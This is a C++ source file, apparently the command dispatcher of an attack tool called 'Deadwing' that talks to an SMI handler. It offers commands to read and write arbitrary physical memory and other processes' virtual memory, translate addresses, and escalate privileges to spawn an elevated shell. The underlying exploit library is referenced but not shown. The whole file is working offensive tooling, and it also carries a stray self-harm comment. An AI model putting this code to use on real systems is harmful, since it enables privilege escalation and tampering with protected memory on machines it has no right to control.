#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <memoryapi.h>
#include <iostream>

#include "HexDump.hpp"
#include "DeadwingCppLib.hpp"

namespace Commands {
	/**
	* \brief Shows available commands
	*/
	void
	WINAPI
	CmdHelp(
		void
	) {
		const wchar_t *CommandList[] = {
			{ L"[+] ping - Ping SMI handler (warn: program will be terminated if this call fails)\n" },
			{ L"[+] varead - Read from specific virtual address\n" },
			{ L"[+] physread - Read from specific physical address\n" },
			{ L"[+] vawrite - Write to the specific virtual address\n" },
			{ L"[+] physwrite - Write to the specific physical address\n" },
			{ L"[+] vtop - Translates virtual address to the physical\n" },
			{ L"[+] priv - Leverages privileges of the current process\n" },
			{ L"[+] exit - Exit from the program (without service termination)\n"},
			{ L"[+] term - Exit from the program and terminate service\n"}
		};

		for(int i = 0; i < (sizeof(CommandList) / sizeof(*CommandList)); i++)
			std::wprintf(L"%s", CommandList[i]);
	}

	/**
	 * \brief Main command dispatcher
	 *
	 * \param DwCommands        Class instance
	 * \param Command           Command which should be executed
	 * \param TerminationSignal Signalizes if service should be deleted
	 *
	 * \returns TRUE if user exited from program (or SMI handler not available)
	 */
	bool
	WINAPI
	CmdMainDispatcher(
		_In_  Deadwing::Commands *DwCommands,
		_In_  wchar_t            *Command,
		_Out_ bool               *TerminationSignal
	) {
		bool ExitSignal = FALSE;
		*TerminationSignal = FALSE;

		// perhaps i should kill myself
		if(!std::wcscmp(Command, L"ping")) {
			if(!DwCommands->Ping()) {
				ExitSignal = TRUE;
				*TerminationSignal = TRUE;
			}
		} else if (!std::wcscmp(Command, L"physread")) {
			UINT64 Address = 0;
			UINT64 Length = 0;

			std::wprintf(L"[ DwUM ] Provide physical address: ");
			std::wscanf(L"%lld", &Address);

			std::wprintf(L"[ DwUM ] Provide length to read: ");
			std::wscanf(L"%lld", &Length);

			PVOID Output = DwCommands->PhysRead(Address, Length);
			if(Output != nullptr) {
				std::wprintf(L"[ DwUM ] Output: \n");
				Hex::HexDump(Output, Length);
			} else {
				std::wprintf(L"[ DwUM ] Unable to perform physical read request\n");
			}

			VirtualFree(Output, Length, MEM_RELEASE);
		} else if (!std::wcscmp(Command, L"varead")) {
			UINT64 Address = 0;
			UINT64 Length = 0;
			UINT64 PID = 0;

			std::wprintf(L"[ DwUM ] Provide virtual address: ");
			std::wscanf(L"%lld", &Address);

			std::wprintf(L"[ DwUM ] Provide length to read: ");
			std::wscanf(L"%lld", &Length);

			std::wprintf(L"[ DwUM ] Provide target process ID: ");
			std::wscanf(L"%lld", &PID);

			PVOID Output = DwCommands->VaRead(Address, Length, PID);
			if(Output != nullptr) {
				std::wprintf(L"[ DwUM ] Output: \n");
				Hex::HexDump(Output, Length);
			} else {
				std::wprintf(L"[ DwUM ] Unable to perform virtual read operation\n");
			}

			VirtualFree(Output, Length, MEM_RELEASE);
		} else if(!std::wcscmp(Command, L"physwrite")) {
			UINT64 Address = 0;
			UINT64 Length = 0;

			std::wprintf(L"[ DwUM ] Provide physical address: ");
			std::wscanf(L"%lld", &Address);

			std::wprintf(L"[ DwUM ] Provide length to read: ");
			std::wscanf(L"%lld", &Length);

			PVOID Data = VirtualAlloc(nullptr, Length, MEM_COMMIT, PAGE_READWRITE);
			if(Data == nullptr) {
				std::wprintf(L"[ DwUM ] Cannot allocate data buffer\n");
				return false;
			}

			// nops for example
			std::memset(Data, 0x90, Length);

			if(!DwCommands->PhysWrite(Address, Length, Data))
				std::wprintf(L"[ DwUM ] Cannot write data to the target physical address\n");
			else
				std::wprintf(L"[ DwUM ] Data has been written to the target physical address\n");

			VirtualFree(Data, Length, MEM_RELEASE);
		} else if(!std::wcscmp(Command, L"vawrite")) {
			UINT64 Address = 0;
			UINT64 Length = 0;
			UINT64 PID = 0;

			std::wprintf(L"[ DwUM ] Provide physical address: ");
			std::wscanf(L"%lld", &Address);

			std::wprintf(L"[ DwUM ] Provide length to read: ");
			std::wscanf(L"%lld", &Length);

			std::wprintf(L"[ DwUM ] Provide target process ID: ");
			std::wscanf(L"%lld", &PID);

			PVOID Data = VirtualAlloc(nullptr, Length, MEM_COMMIT, PAGE_READWRITE);
			if(Data == nullptr) {
				std::wprintf(L"[ DwUM ] Cannot allocate data buffer\n");
				return false;
			}

			// nops for example
			std::memset(Data, 0x90, Length);

			if(!DwCommands->VaWrite(Address, Length, PID, Data))
				std::wprintf(L"[ DwUM ] Cannot write data to the target physical address\n");
			else
				std::wprintf(L"[ DwUM ] Data has been written to the target physical address\n");

			VirtualFree(Data, Length, MEM_RELEASE);
		} else if(!std::wcscmp(Command, L"vtop")) {
			UINT64 Address = 0;
			UINT64 PID = 0;

			std::wprintf(L"[ DwUM ] Provide virtual address to translate: ");
			std::wscanf(L"%lld", &Address);

			std::wprintf(L"[ DwUM ] Provide target process ID: ");
			std::wscanf(L"%lld", &PID);

			UINT64 Translated = DwCommands->Vtop(Address, PID);
			if(Translated != 0)
				std::wprintf(L"[ DwUM ] Translated: 0x%llX (VA) => 0x%llX (Physical)\n", Address, Translated);
			else
				std::wprintf(L"[ DwUM ] Cannot translate virtual address\n");
		} else if(!std::wcscmp(Command, L"priv")) {
			if(!DwCommands->EscPriv())
				std::wprintf(L"[ DwUM ] Unable to spawn elevated shell\n");
		} else if(!std::wcscmp(Command, L"exit")) {
			ExitSignal = true;
		} else if(!std::wcscmp(Command, L"term")) {
			ExitSignal = true;
			*TerminationSignal = true;
		} else {
			CmdHelp();
		}

		return ExitSignal;
	}
}
